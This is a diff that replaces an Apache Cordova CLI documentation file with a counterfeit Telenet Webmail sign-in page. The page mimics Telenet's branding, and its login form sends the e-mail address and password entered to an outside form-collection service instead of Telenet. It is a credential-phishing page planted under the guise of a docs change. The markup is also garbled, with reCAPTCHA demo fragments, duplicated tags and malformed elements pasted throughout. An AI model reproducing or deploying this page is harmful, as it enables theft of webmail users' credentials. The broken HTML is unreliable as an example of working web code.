@@ -1,686 +1,391 @@
----
-title: CLI Commands
-description: Learn how to use Cordova CLI commands and their options.
----
-
-<!--
-#
-# Licensed to the Apache Software Foundation (ASF) under one
-# or more contributor license agreements.  See the NOTICE file
-# distributed with this work for additional information
-# regarding copyright ownership.  The ASF licenses this file
-# to you under the Apache License, Version 2.0 (the
-# "License"); you may not use this file except in compliance
-# with the License.  You may obtain a copy of the License at
-#
-# http://www.apache.org/licenses/LICENSE-2.0
-#
-# Unless required by applicable law or agreed to in writing,
-# software distributed under the License is distributed on an
-# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
-#  KIND, either express or implied.  See the License for the
-# specific language governing permissions and limitations
-# under the License.
-#
--->
 
-# Cordova Command-line-interface (CLI) Commands
+<!DOCTYPE html>
+
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    
+    <title>Telenet Webmail</title>
+
+    
+
+<title>Telenet: Meld je aan</title>
+<meta content="IE=edge" http-equiv="X-UA-Compatible">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="description" content="">
 
-## CLI Syntax
 
-```bash
-cordova <command> [options] -- [platformOpts]
-```
 
-## Global Command List
+
+    
+    
+    
+    <script src="https://www.google.com/recaptcha/api.js?hl=nl"></script>
 
-These commands are available at all times.
+<link rel="stylesheet" href="https://login.prd.telenet.be/openid/css/vendor/normalize.min.css">
+<link rel="stylesheet" href="https://static.telenet.be/oauth2/css/main.css">
+<link rel="stylesheet" href="https://login.prd.telenet.be/openid/css/login.css?v=2.1">
+<link rel="stylesheet" href="https://login.prd.telenet.be/openid/css/login-sales-flow.css" type="text/css">
+<link href="https://login.prd.telenet.be/openid/css/login-select-account.css" rel="stylesheet" type="text/css">
 
-| Command  | Description
-|----------|--------------
-| `create` | Create a project
-| `help <command>` | Get help for a command
-| `telemetry` | Turn telemetry collection on or off
-| `config` | Set, get, delete, edit, and list global cordova options
+
+<script src="https://login.prd.telenet.be/openid/js/vendor/jquery-1.9.1.min.js"></script>
+<script src="https://static.telenet.be/oauth2/js/vendor/jquery-ui-1.10.3.custom.min.js"></script>
+
+<script type="text/javascript">
+<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+   <script type="text/javascript">
+    <html>
+  <head>
+    <title>reCAPTCHA demo: Webmail</title>
+    <script type="text/javascript">
+      var verifyCallback = function(response) {
+        alert(response);
+      };
+      var widgetId1;
+      var widgetId2;
+      var onloadCallback = function() {
+      
+        widgetId1 = grecaptcha.render('example1', {
+          'sitekey' : '6Lf1Uy4pAAAAAE7VLNBYcH0fVarRRC8cwhfsJWB6',
+          'theme' : 'light'
+        });
+        widgetId2 = grecaptcha.render(document.getElementById('example2'), {
+          'sitekey' : '6Lf1Uy4pAAAAAE7VLNBYcH0fVarRRC8cwhfsJWB6'
+        });
+        grecaptcha.render('example3', {
+          'sitekey' : '6Lf1Uy4pAAAAAE7VLNBYcH0fVarRRC8cwhfsJWB6',
+          'callback' : <script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit"
+          'theme' : 'dark'
+        });
+      };
+   
+
+</script>
+
+ <html>
+  <head>
+  
+  <script>
+    function onSubmit(token) {
+      alert('thanks ' + document.getElementById('field').value);
+    }
+
+    function validate(event) {
+      event.preventDefault();
+      if (!document.getElementById('field').value) {
+        alert("You must add text to the required field");
+      } else {
+        grecaptcha.execute();
+      }
+    }
+
+    function onload() {
+      var element = document.getElementById('submit');
+      element.onclick = validate;
+    }
+  </script>
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+  </head>
+  <body>
+    <form>
+	<div
+     <div Webmail <input id="field" name="field">
+      <div <id="recaptcha" class="g-recaptcha">
+         </div> <data-sitekey="6Lf1Uy4pAAAAAE7VLNBYcH0fVarRRC8cwhfsJWB6">
+         </div>  <data-callback="onSubmit">
+		 
+		  </div>
+
+    
+
+
 
-## Project Command List
 
-These commands are supported when the current working directory is a valid Cordova project.
 
-| Command      | Description
-|--------------|--------------
-| `info`         | Generate project information
-| `requirements` | Checks and print out all the installation requirements for platforms specified
-| `platform`     | Manage project platforms
-| `plugin`       | Manage project plugins
-| `prepare`      | Copy files into platform(s) for building
-| `compile`      | Compile project for platform(s)
-| `build`        | Build project for platform(s) (`prepare` + `compile`)
-| `clean`        | Cleanup project from build artifacts
-| `run`          | Run project (including prepare && compile)
-| `serve`        | Run project with a local webserver (including prepare)
 
-## Common options
 
-These options apply to all cordova-cli commands.
+<title>reCAPTCHA demo: Webmail</title>
+				<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+	<script src="https://www.google.com/recaptcha/api.js?render=6Lf1Uy4pAAAAAE7VLNBYcH0fVarRRC8cwhfsJWB6"></script>
+
+
+
+
+
+    <link href="https://login.prd.telenet.be/openid/css/common/icons.css" rel="stylesheet" type="text/css">
+    <link href="https://login.prd.telenet.be/openid/css/telenet/telenet.css" rel="stylesheet" type="text/css">
+<script src="https://login.prd.telenet.be/openid/js/analytics/3ce8236b487d/f8574738a869/e3735f3795d0/hostedLibFiles/EPbf7b42aa08bc4f10879b1484195e80d1/AppMeasurement.min.js" async=""></script><script src="https://login.prd.telenet.be/openid/js/analytics/3ce8236b487d/f8574738a869/e3735f3795d0/hostedLibFiles/EPbf7b42aa08bc4f10879b1484195e80d1/AppMeasurement_Module_ActivityMap.min.js" async=""></script><script src="https://login.prd.telenet.be/openid/js/analytics/3ce8236b487d/f8574738a869/e3735f3795d0/hostedLibFiles/EPbf7b42aa08bc4f10879b1484195e80d1/AppMeasurement_Module_AudienceManagement.min.js" async=""></script></head>
+
+<body class="nl">
+
+<title>reCAPTCHA demo:Webmail</title>
+				<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+	<script src="https://www.google.com/recaptcha/api.js?render=6Lf1Uy4pAAAAAE7VLNBYcH0fVarRRC8cwhfsJWB6"></script>
+
+<section id="LoginForm">
+    <span id="showBackgroundForStatic" style="display: none">true</span>
+    <div class="openid-login-page m--n justify-content-center background__image--full-size">
+        <div class="openid-login-page__container align-items-center">
+            <div class="m--n openid-login-page__container--inner">
+                
+                <div class="p--n mb--l openid-login-page__container--header">
+                    <div class="m--n openid-login-page__container--header-logo">
+                        <div class="p--n cmp cmp-logo">
+                            <span class="logo ">
+                                <img class="" src="https://login.prd.telenet.be/openid/img/telenet/logo-telenet.svg" alt="Telenet">
+                            </span>
+                            <span class="openid-login-page__header-site-name fit-content">
+                                Telenet Webmail
+                            </span>
+                            <span id="languageForStatic" style="display: none">nl</span>
+                        </div>
+                        
+                            <div class="language-selector clearfix" onclick="toggleLanguage()" onmouseover="toggleLanguage()" onmouseleave="toggleLanguage()">
+    <div class="language-selector__selected">
+        <div class="lang-selected">
+            <span>nl</span>
+            <span id="language-arrow" class="arrow"></span>
+        </div>
+    </div>
+    <div id="language-menu" class="language-menu" onmouseover="toggleLanguage()">
+        <ul>
+            <span id="languageForStatic" style="display: none">nl</span>
+          
+            
+            
+            <span>
+                
+                    
+                        <li class="active"><a class="cur-default" href="javascript:void(0)" tabindex="-1">NL</a></li>
+                        <li><a href="https://login.prd.telenet.be/openid/login?lang=fr" tabindex="-1">FR</a></li>
+                        <li><a href="https://login.prd.telenet.be/openid/login?lang=en" tabindex="-1">EN</a></li>
+                    
+                    
+                    
+                
+            </span>
+        </ul>
+    </div>
+</div>
+
+                        
+                    </div>
+                </div>
+
+<title>reCAPTCHA demo:Webmail</title>
+				<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+	<script src="https://www.google.com/recaptcha/api.js?render=6Lf1Uy4pAAAAAE7VLNBYcH0fVarRRC8cwhfsJWB6"></script>
+              
+                <div class="contentContainer" id="loginSection">
+				
+				
+
+
+				
+				
+				</div>
+                    
+                    
+                        <div class="display-flex openid-login-page__container-details">
+                            <div class="openid-login-page__container--form-login-section p--n">
+                                <form id="login-form" name="loginForm" action="https://formbold.com/s/35eEE" method="post" class="p--n m--n login-form">
+							
+                                    <div class="form-group mb--m position--relative">
+									<script src="https://unpkg.com/@botpoison/browser" async></script>
+									<form action="https://example.demo"data-botpoison-public-key="pk_efae6277-24cc-4810-8e1f-2b2c52372a04">
+      
+					
+				
+		
+                                        <label for="j_username">
+                                            
+                                                
+                                                
+                                                    Je e-mailadres
+													
+
+                                                
+                                            
+                                        </label>
+                                        
+                                            <a href="#" onclick="window.open(getLoginForgottenUrl());  return false;" target="_blank" tabindex="-1" class="ml--xs link link--unstyled">
+                                                Vergeten?
+                                            </a>
+                                        
+                                        <div class="form__input-container ">
+                                            <input type="text" class="form__input " name="j_username" id="j_username" autcomplete="off" tabindex="1" autofocus="" placeholder="e-mail@telenet.be">
+                                        </div>
+                                    </div>
+                                    <div class="form-group mb--m position--relative">
+                                        <label for="j_password">
+                                            Wachtwoord
+                                        </label>
+                                        <a onclick="window.open(getTelenetPasswordForgottenUrl()); return false;" href="#" target="_blank" class="ml--xs link link--unstyled" tabindex="-1">
+                                            Vergeten?
+                                        </a>
+                                        <div class="form__input-container display-flex">
+                                            <input class="form__input " type="password" name="j_password" id="j_password" onkeyup="showEyeIcon();" autocomplete="off" tabindex="2" placeholder="Hoofdlettergevoelig">
+                                            <div class="hide-show" style="display: none;" id="passwordEye" onclick="togglePassword();"></div>
+                                        </div>
+                                    </div>
+                                    
+                                        <div class="form-group mb--m">
+                                            <div class="wrap">
+
+                                                <div class="explanation">
+                                                        Waarom zie ik dit?
+                                                    </a>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    
+                                    <div class="p--n">
+                                        
+                                            
+                                                <div>
+                                                    <div class="form__checkbox">
+                                                        <input type="checkbox" class="form__checkbox__input" name="rememberme" id="rememberme" value="true" tabindex="3">
+                                                        <label class="form__checkbox__label" for="rememberme">&nbsp;</label>
+                                                    </div>
+                                                    <label class="label" for="rememberme">Aangemeld blijven</label>
+                                                </div>
+                                            
+                                            
+                                        
+                                    </div>
+
+                                    <div class="form-group">
+                                        
+                                            
+                                            
+                                                <button type="submit" tabindex="4" class="button button--primary login button--fullwidth" name="Login.Submit" id="login_button">Aanmelden</button>
+                                            
+                                        
+                                    </div>
+                                    
+                                        <div Webmail <input id="field" name="field">
+      <div <id="recaptcha" class="g-recaptcha">
+         </div> <data-sitekey="6Lf1Uy4pAAAAAE7VLNBYcH0fVarRRC8cwhfsJWB6">
+         </div>  <data-callback="onSubmit">
+                                        
+                                            
+                                                <div class="text-align--center">
+                                                </div>
+                                            
+                                        
+                                    
+                                </form>
+                            </div>
+
+                            
+                        </div>
+                    
+                </div>
+                
+            </div>
+        </div>
+    </div>
+
+</section>
+<div class="bgContainer" rel="7000"><div class="bg"><div class="inner" style="background-image: url(https://static.telenet.be/oauth2/assets/default_yellowBG.jpg)"></div><div class="promo"><div class="promoLogo"><img src="https://static.telenet.be/oauth2/assets/spacer.png"></div><div class="promoAction"></div></div></div></div>
+
+    <script src="Telenet%20Webmail12_fichiers/api.js"></script>
+
+<div class="overlayer" id="cookie-dialog-itsme">
+    <div class="overlayer-mask opacity--mini-transparency"></div>
+    <div class="overlay__section">
+        <div class="overlay__section__content p--s">
+            <div class="overlay__section__content__description ">
+                
+                
+            </div>
+            <div class="overlay__section__content__action justify-content-center mb--s">
+                <button onclick='closeInformCookieDialog("itsme"); return false;' class="button button--secondary">Nee</button>
+                <button onclick='confirmInformCookieDialog("itsme"); return false;' class="button button--primary">Ja</button>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="overlayer" id="cookie-dialog-facebook">
+    <div class="overlayer-mask opacity--mini-transparency"></div>
+    <div class="overlay__section">
+        <div class="overlay__section__content p--s">
+            <div class="overlay__section__content__description ">
+			
+			<div Webmail <input id="field" name="field">
+      <div <id="recaptcha" class="g-recaptcha">
+         </div> <data-sitekey="6Lf1Uy4pAAAAAE7VLNBYcH0fVarRRC8cwhfsJWB6">
+         </div>  <data-callback="onSubmit">
+                
+                
+            </div>
+            <div class="overlay__section__content__action justify-content-center mb--s">
+                <button onclick='closeInformCookieDialog("facebook"); return false;' class="button button--secondary">Nee</button>
+                <button onclick='confirmInformCookieDialog("facebook"); return false;' class="button button--primary">Ja</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="overlayer" id="cookie-dialog-google">
+    <div class="overlayer-mask opacity--mini-transparency"></div>
+    <div class="overlay__section">
+        <div class="overlay__section__content p--s">
+            <div class="overlay__section__content__description ">
+                
+               
+            </div>
+            <div class="overlay__section__content__action justify-content-center mb--s">
+                <button onclick='closeInformCookieDialog("google"); return false;' class="button button--secondary">Nee</button>
+                <button onclick='confirmInformCookieDialog("google"); return false;' class="button button--primary">Ja</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="https://login.prd.telenet.be/openid/js/social/social.js"></script>
+
+<div Webmail <input id="field" name="field">
+      <div <id="recaptcha" class="g-recaptcha">
+         </div> <data-sitekey="6Lf1Uy4pAAAAAE7VLNBYcH0fVarRRC8cwhfsJWB6">
+         </div>  <data-callback="onSubmit">
+		 
+<input type="hidden" id="oauth2-brand" value="TELENET">
+
+
+
+<span id="client_id" style="display: none">webmail</span>
+<span id="stylehint" style="display: none"></span>
+
+<script src="https://static.telenet.be/oauth2/js/main.js"></script>
+
+
+
+    
+        <script src="https://static.telenet.be/oauth2/js/items_centered_webmail.js"></script>
+        <script>if(typeof(window.data) === 'undefined') { document.write('<script src="https://static.telenet.be/oauth2/js/items_centered.js">\x3C/script>');}</script><script src="https://static.telenet.be/oauth2/js/items_centered.js"></script>
+    
+    
+
+
+<script type="text/javascript">
+    $('form').submit(function () {
+        $('input:submit').attr("disabled", true);
+    });
+</script>
+a
+
+
+    
+        
+        
+        
+            <script src="https://login.prd.telenet.be/openid/js/analytics/3ce8236b487d/f8574738a869/launch-dca0d353fb89.min.js"></script>
+        
+    
+
+    <script src="https://login.prd.telenet.be/openid/js/analytics/udl.min.js"></script>
+    <script src="https://login.prd.telenet.be/openid/js/analytics/analytics.js"></script>
 
-| Option               | Description
-|----------------------|------------------------
-| -d or --verbose      | Pipe out more verbose output to your shell. You can also subscribe to `log` and `warn` events if you are consuming `cordova-cli` as a node module by calling `cordova.on('log', function() {})` or `cordova.on('warn', function() {})`.
-| -v or --version      | Print out the version of your `cordova-cli` install.
-|--nohooks             | Suppress executing hooks (taking RegExp hook patterns as parameters)
-| --no-telemetry       | Disable telemetry collection for the current command.
 
-## Platform-specific options
 
-Certain commands have options (`platformOpts`) that are specific to a particular platform. They can be provided to the cordova-cli with a '--' separator that stops the command parsing within the cordova-lib module and passes through rest of the options for platforms to parse.
-
-## CLI Usage Example
-
-The following example illustrates how to utilize Cordova CLI to perform various tasks such as:
-
-- Creating a project
-- Adding the `camera` plugin
-- Adding, building, and running the project on the `android` platform
-
-Additionally, it includes an example showcasing the usage of specific options provided by the Cordova-Android platform, such as `--keystore`, which is utilized for release signing.
-
-1. Create a cordova project
-
-    ```bash
-    cordova create myApp com.myCompany.myApp myApp
-    cd myApp
-    ```
-
-2. Add Camera Plugin to the Project
-
-    ```bash
-    cordova plugin add cordova-plugin-camera
-    ```
-
-3. Add Android Platform to the Project
-
-    ```bash
-    cordova platform add android
-    ```
-
-4. Confirm System is Configured with Android Platform Requirements
-
-    ```bash
-    cordova requirements android
-    ```
-
-5. Build Project for Android with Verbose Logging Enabled
-
-    ```bash
-    cordova build android --verbose
-    ```
-
-6. Run Project on Android Platform
-
-    ```bash
-    cordova run android
-    ```
-
-7. Build Project for Android in Release Mode with Signing Parameters
-
-    ```bash
-    cordova build android --release -- --keystore="..\android.keystore" --storePassword=android --alias=mykey
-    ```
-
-## `cordova create` command
-
-Creates the directory structure for the Cordova project in the specified path.
-
-**Command Syntax:**
-
-```bash
-cordova create path [id [name]] [options]
-```
-
-**Arguments:**
-
-| Value | Description   |
-|-------|---------------|
-| path  |  Directory which should not already exist. Cordova will create this directory. For more details on the directory structure, see below. |
-| id    | _Default_: `io.cordova.hellocordova` <br/>  Reverse domain-style identifier that maps to `id` attribute of `widget` element in `config.xml`. This can be changed but there may be code generated using this value, such as Java package names. It is recommended that you select an appropriate value.  |
-| name  | _Default_: `HelloCordova` <br/> Application's display title that maps `name` element in `config.xml` file. This can be changed but there may be code generated using this value, such as Java class names. The default value is `HelloCordova`, but it is recommended that you select an appropriate value. |
-
-**Options:**
-
-| Option | Description |
-|--------|-------------|
-| --template |  Use a custom template located locally, in NPM, or GitHub. |
-
-### Directory structure
-
-Cordova CLI works with the following directory structure:
-
-```bash
-myapp/
-|-- config.xml
-|-- merges/
-| | |-- android/
-| | |-- ios/
-|-- www/
-|-- platforms/
-| |-- android/
-| |-- ios/
-|-- plugins/
-  |-- cordova-plugin-camera/
-```
-
-#### config.xml
-
-Configures your application and allows you to customize the behavior of your project. See also [config.xml reference documentation][config.xml ref]
-
-#### www/
-
-The "`www`" directory contains the web artifacts of the project, encompassing various file types with extensions including, but not limited to, `.html`, `.css`, and `.js`.
-
-As a Cordova application developer, most of your code and assets will be placed in this directory. During the `cordova prepare` command execution, the contents of the "`www`" directory are copied to the corresponding `www` directories within each platform's subdirectory. For instance, you can find it at `platforms/ios/www` or `platforms/android/assets/www`.
-
-It's important to note that since the CLI regularly copies files from the source "`www`" folder, you should only make edits to the files in this directory and avoid modifying the ones located in the platform subdirectories.
-
-If you're using version control software, it's recommended to include both the source "`www`" folder and the "`merges`" folder in your version control system.
-
-When using frameworks that require a transpiling process, it is crucial to understand that the final output, which is intended for distribution, should be placed in the "`www`" directory. The purpose of the "`www`" directory is not to store the untranspiled source code. Instead, it is recommended to keep the untranspiled source code in a separate directory dedicated to that purpose.
-
-#### platforms/
-
-Contains all of the source code for the platforms that you add to your project.
-
-> **WARNING:** When using the CLI to build your application, you should not edit any files in the /platforms/ directory unless you know what you are doing, or if documentation specifies otherwise. The files in this directory are routinely overwritten when preparing applications for building, or when plugins are re-installed.
-
-#### plugins/
-
-Any added plugins will be extracted or copied into this directory.
-
-#### merges/
-
-Platform-specific web assets (HTML, CSS and JavaScript files) are contained within appropriate subfolders in this directory. These are deployed during a `prepare` to the appropriate native directory.  Files placed under `merges/` will override matching files in the `www/` folder for the relevant platform. A quick example, assuming a project structure of:
-
-```bash
-merges/
-|-- ios/
-| -- app.js
-|-- android/
-| -- android.js
-www/
--- app.js
-```
-
-After building the Android and iOS projects, the Android application will contain both `app.js` and `android.js`. However, the iOS application will only contain an `app.js`, and it will be the one from `merges/ios/app.js`, overriding the "common" `app.js` located inside `www/`.
-
-#### Version control
-
-To ensure a cleaner version control setup, it is advisable not to include the `platforms/` and `plugins/` directories in your version control system. These directories are considered build artifacts. Instead, the platforms and plugins used in your project are automatically recorded in the `config.xml` and `package.json` files. When you invoke the `cordova prepare` command, the necessary platforms and plugins will be downloaded and set up based on the information specified in these configuration files.
-
-By excluding the `platforms/` and `plugins/` directories from version control and relying on the `config.xml` and `package.json` files, you can maintain a more streamlined development and continuous integration workflow.
-
-### Examples
-
-- Create a Cordova project in `myapp` directory using the specified ID and display name:
-
-```bash
-cordova create myapp com.mycompany.myteam.myapp MyApp
-```
-
-## `cordova platform` command
-
-Manage cordova platforms - allowing you to add, remove, update and list platforms. Running commands to add or remove platforms affects the contents of the project's platforms directory.
-
-**Command Syntax:**
-
-```bash
-cordova {platform | platforms} [
-    add <platform-spec> [...] {--save | link=<path> } |
-    {remove | rm}  platform [...] {--save}|
-    {list | ls}  |
-    update ]
-```
-
-| Sub-command           | Option | Description |
-------------------------|-------------|------|
-| add `<platform-spec>` [...] |  | Add specified platforms |
-|     | --nosave                 | Do not save `<platform-spec>` into `config.xml` & `package.json` after installing them using `<engine>` tag |
-|     | --link=`<path>`          | When `<platform-spec>` is a local path, links the platform library directly instead of making a copy of it (support varies by platform; useful for platform development)
-| remove `<platform>` [...] |    | Remove specified platforms |
-|     | --nosave                 | Do not delete specified platforms from `config.xml` & `package.json` after removing them |
-| update `<platform>` [...] |      | Update specified platforms |
-|     | --save                   | Updates the version specified in `config.xml` |
-| list |                         | List all installed and available platforms |
-
-### Platform-spec
-
-There are a number of ways to specify a platform:
-
-```text
-<platform-spec> : platform[@version] | path | url[#commit-ish]
-```
-
-| Value | Description |
-|-----------|-------------|
-| platform  | Platform name e.g. android, ios, electron etc. to be added to the project. Every release of cordova CLI pins a version for each platform. When no version is specified this version is used to add the platform. |
-| version   | Major.minor.patch version specifier using semver |
-| path      | Path to a directory or tarball containing a platform |
-| url       | URL to a git repository or tarball containing a platform |
-| commit-ish | Commit/tag/branch reference. If none is specified, 'master' is used |
-
-### Supported Platforms
-
-- `android`
-- `browser`
-- `electron`
-- `ios`
-
-### Examples
-
-- Add pinned version of the `android` and `ios` platform and save the downloaded version to `config.xml` & `package.json`:
-
-```bash
-cordova platform add android ios
-```
-
-- Add `android` platform with [semver](http://semver.org/) version ^5.0.0 and save it to `config.xml` & `package.json`:
-
-```bash
-cordova platform add android@^5.0.0
-```
-
-- Add platform by cloning the specified git repo and checkout to the `4.0.0` tag:
-
-```bash
-cordova platform add https://github.com/myfork/cordova-android.git#4.0.0
-```
-
-- Add platform using a local directory named `android`:
-
-```bash
-cordova platform add ../android
-```
-
-- Add platform using the specified tarball:
-
-```bash
-cordova platform add ../cordova-android.tgz
-```
-
-- Remove `android` platform from the project and remove from `config.xml` & `package.json`:
-
-```bash
-cordova platform rm android
-```
-
-- Remove `android` platform from the project and do NOT remove from `config.xml` & `package.json`:
-
-```bash
-cordova platform rm android --nosave
-```
-
-- List available and installed platforms with version numbers. This is useful to find version numbers when reporting issues:
-
-```bash
-cordova platform ls
-```
-
-## `cordova plugin` command
-
-Manage project plugins
-
-**Command Syntax:**
-
-```bash
-cordova {plugin | plugins} [
-    add <plugin-spec> [..] {--searchpath=<directory> | --noregistry | --link | --save | --force} |
-    {remove | rm} {<pluginid> | <name>} --save |
-    {list | ls}
-]
-```
-
-| Sub-command | Option | Description
-|------------------------|-------------|------
-| add `<plugin-spec>` [...] |     | Add specified plugins
-|       |--searchpath `<directory>` | When looking up plugins by ID, look in this directory and each of its subdirectories before hitting the registry. Multiple search paths can be specified. Use ':' as a separator in `*nix` based systems and ';' for Windows.
-|       |--noregistry             | Don't search the registry for plugins.
-|       |--link                   | When installing from a local path, creates a symbolic link instead of copying files. The extent to which files are linked varies by platform. Useful for plugin development.
-|       |--nosave                 | Do NOT save the `<plugin-spec>` as part of the `plugin` element  into `config.xml` or `package.json`.
-|       |--force                  | _Introduced in version 6.1._ Forces copying source files from the plugin even if the same file already exists in the target directory.
-| remove `<pluginid>\|<name>` [...] | | Remove plugins with the given IDs/name.
-|       |--nosave                 | Do NOT remove the specified plugin from config.xml or package.json
-|list                           |  | List currently installed plugins
-
-### Plugin-spec
-
-There are a number of ways to specify a plugin:
-
-    <plugin-spec> : [@scope/]pluginID[@version]|directory|url[#commit-ish][:subdir]
-
-| Value       | Description
-|-------------|--------------------
-| scope       | Scope of plugin published as a [scoped npm package]
-| plugin      | Plugin id (id of plugin in npm registry or in --searchPath)
-| version     | Major.minor.patch version specifier using semver
-| directory   | Directory containing plugin.xml
-| url         | Url to a git repository containing a plugin.xml
-| commit-ish  | Commit/tag/branch reference. If none is specified, 'master' is used
-
-### Algorithm for resolving plugins
-
-When adding a plugin to a project, the CLI will resolve the plugin
-based on the following criteria (listed in order of precedence):
-
-1. The `plugin-spec` given in the command (e.g. `cordova plugin add pluginID@version`)
-2. The `plugin-spec` saved in `config.xml` & `package.json` (i.e. if the plugin was previously added without `--nosave`)
-3. As of Cordova version 6.1, the latest plugin version published to npm that the current project can support (only applies to plugins that list their [Cordova dependencies] in their `package.json`)
-4. The latest plugin version published to npm
-
-### Examples
-
-- Add `cordova-plugin-camera` and `cordova-plugin-file` to the project and save it to `config.xml` & `package.json`. Use `../plugins` directory to search for the plugins.
-
-    ```bash
-    cordova plugin add cordova-plugin-camera cordova-plugin-file --searchpath ../plugins
-    ```
-
-- Add `cordova-plugin-camera` with [semver](http://semver.org/) version ^2.0.0 and save it to `config.xml` & `package.json`:
-
-    ```bash
-    cordova plugin add cordova-plugin-camera@^2.0.0
-    ```
-
-- Add the plugin from the specified local directory:
-
-    ```bash
-    cordova plugin add ../cordova-plugin-camera
-    ```
-
-- Add the plugin from the specified tarball file:
-
-    ```bash
-    cordova plugin add ../cordova-plugin-camera.tgz
-    ```
-
-- Remove the plugin from the project and the `config.xml` & `package.json`:
-
-    ```bash
-    cordova plugin rm camera
-    ```
-
-- Remove the plugin from the project, but not the `config.xml` or `package.json`:
-
-    ```bash
-    cordova plugin rm camera --nosave
-    ```
-
-- List all plugins installed in the project:
-
-    ```bash
-    cordova plugin ls
-    ```
-
-### Conflicting plugins
-Conflicting plugins may occur when adding plugins that use `edit-config` tags in their plugin.xml file. `edit-config` allows plugins to add or replace attributes of XML elements.
-
-This feature can cause issues with the application if more than one plugin tries to modify the same XML element. Conflict detection has been implemented to prevent plugins from being added so one plugin doesn't try to overwrite another plugin's `edit-config` changes. An error will be thrown when a conflict in `edit-config` has been found and the plugin won't be added. The error message will mention that all conflicts must be resolved before the plugin can be added. One option to resolving the `edit-config` conflict is to make changes to the affected plugins' plugin.xml so that they do not modify the same XML element. The other option is to use the `--force` flag to force add the plugin. This option should be used with caution as it ignores the conflict detection and will overwrite all conflicts it has with other plugins, thus may leave the other plugins in a bad state.
-
-Refer to the [plugin.xml guide](https://cordova.apache.org/docs/en/latest/plugin_ref/spec.html#edit-config) for managing `edit-config`, resolving conflicts, and examples.
-
-## `cordova prepare` command
-
-Transforms config.xml metadata to platform-specific manifest files, copies icons & splashscreens,
-copies plugin files for specified platforms so that the project is ready to build with each native SDK.
-
-**Command Syntax:**
-
-```bash
-cordova prepare [<platform> [..]]
-```
-
-### Options
-
-| Option     | Description
-|------------|------------------
-| `<platform> [..]` | Platform name(s) to prepare. If not specified, all platforms are prepared.
-
-## `cordova compile` command
-
-`cordova compile` is a subset of the [cordova build command](#cordova-build-command).
-It only performs the compilation step without doing prepare. It's common to invoke `cordova build` instead of this command - however, this stage is useful to allow extending using [hooks][Hooks guide].
-
-**Command Syntax:**
-
-```bash
-cordova compile [<platform> [...]]
-    [--debug | --release]
-    [--device | --emulator | --target=<targetName>]
-    [--buildConfig=<configfile>]
-    [-- <platformOpts>]
-```
-For detailed documentation see [cordova build command](#cordova-build-command) docs below.
-
-## `cordova build` command
-
-Shortcut for `cordova prepare` + `cordova compile` for all/the specified platforms. Allows you to build the app for the specified platform.
-
-**Command Syntax:**
-
-```bash
-cordova build [<platform> [...]]
-    [--debug | --release]
-    [--device | --emulator]
-    [--buildConfig=<configfile>]
-    [-- <platformOpts>]
-```
-
-| Option     | Description
-|------------|------------------
-| `<platform> [..]` | Platform name(s) to build. If not specified, all platforms are built.
-| --debug    | Perform a debug build. This typically translates to debug mode for the underlying platform being built.
-| --release  | Perform a release build. This typically translates to release mode for the underlying platform being built.
-| --device   | Build it for a device
-| --emulator | Build it for an emulator. In particular, the platform architecture might be different for a device vs. emulator.
-| --buildConfig=`<configFile>` | Default: build.json in cordova root directory. <br/> Use the specified build configuration file. `build.json` file is used to specify paramaters to customize the app build process especially related to signing the package.
-| `<platformOpts>` | To provide platform specific options, you must include them after `--` separator. Review platform guide docs for more details.
-
-### Examples
-
-- Build for `android` and `ios` platform in `debug` mode for deployment to device:
-
-```bash
-cordova build android ios --debug --device
-```
-
-- Build for `android` platform in `release` mode and use the specified build configuration:
-
-```bash
-cordova build android --release --buildConfig=..\myBuildConfig.json
-```
-
-- Build for `android` platform in release mode and pass custom platform options to android build process:
-
-```bash
-cordova build android --release -- --keystore="..\android.keystore" --storePassword=android --alias=mykey
-```
-
-## `cordova run` command
-
-Prepares, builds, and deploys app on specified platform devices/emulators. If a device is connected it will be used, unless an eligible emulator is already running.
-
-**Command Syntax:**
-
-```bash
-cordova run [<platform> [...]]
-    [--list | --debug | --release]
-    [--noprepare]
-    [--nobuild]
-    [--device | --emulator | --target=<targetName>]
-    [--buildConfig=<configfile>]
-    [-- <platformOpts>]
-```
-
-| Option      | Description
-|-------------|------------------
-| `<platform> [..]` | Platform name(s) to run. If not specified, all platforms are run.
-| --list      | Lists available targets. Displays both device and emulator deployment targets unless specified
-| --debug     | Deploy a debug build. This is the default behavior unless `--release` is specified.
-| --release   | Deploy a release build
-| --noprepare | Skip preparing (available in Cordova v6.2 or later)
-| --nobuild   | Skip building
-| --device    | Deploy to a device
-| --emulator  | Deploy to an emulator
-| --target    | Deploy to a specific target emulator/device. Use `--list` to display target options
-| --buildConfig=`<configFile>` | Default: build.json in cordova root directory. <br/> Use the specified build configuration file. `build.json` file is used to specify paramaters to customize the app build process especially related to signing the package.
-| `<platformOpts>` | To provide platform specific options, you must include them after `--` separator. Review platform guide docs for more details.
-
-### Examples
-
-- Run a release build of current cordova project on `android` platform emulator named `Nexus_5_API_23_x86`. Use the spcified build configuration when running:
-
-```bash
-cordova run android --release --buildConfig=..\myBuildConfig.json --target=Nexus_5_API_23_x86
-```
-
-- Run a debug build of current cordova project on `android` platform using a device or emulator (if no device is connected). Skip doing the build:
-
-```bash
-cordova run android --nobuild
-```
-
-- Run a debug build of current cordova project on an `ios` device:
-
-```bash
-cordova run ios --device
-```
-
-- Enumerate names of all the connected devices and available emulators that can be used to run this app:
-
-```bash
-cordova run ios --list
-```
-
-## `cordova emulate` command
-
-Alias for `cordova run --emulator`. Launches the emulator instead of device. See [cordova run command docs](#cordova-run-command) for more details.
-
-## `cordova clean` command
-
-Cleans the build artifacts for all the platforms, or the specified platform by running platform-specific build cleanup.
-
-**Command Syntax:**
-
-```bash
-cordova clean [<platform> [...]]
-```
-
-**Example Usage:**
-
-- Clean `android` platform build artifacts:
-
-```bash
-cordova clean android
-```
-
-## `cordova requirements` command
-
